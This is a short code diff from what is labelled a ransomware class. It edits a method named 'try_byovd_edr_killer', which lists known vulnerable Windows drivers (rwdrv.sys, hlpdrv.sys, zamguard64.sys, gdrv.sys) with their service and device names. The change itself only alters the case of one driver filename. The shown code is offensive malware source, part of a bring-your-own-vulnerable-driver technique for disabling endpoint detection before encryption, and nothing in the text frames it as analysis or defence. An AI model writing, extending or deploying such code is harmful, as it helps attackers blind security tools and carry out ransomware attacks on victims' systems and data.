@@ -898,7 +898,7 @@ class RansomWare:
     # ====================== BYOVD EDR KILLER ======================
     def try_byovd_edr_killer(self):
         drivers = [
-            {"name": "rwdrv.sys", "service": "rwdrv", "device": "rwdrv"},
+            {"name": "RwDrv.sys", "service": "rwdrv", "device": "rwdrv"},
             {"name": "hlpdrv.sys", "service": "hlpdrv", "device": "hlpdrv"},
             {"name": "zamguard64.sys", "service": "zam", "device": "zam"},
             {"name": "gdrv.sys", "service": "gdrv", "device": "gdrv"},
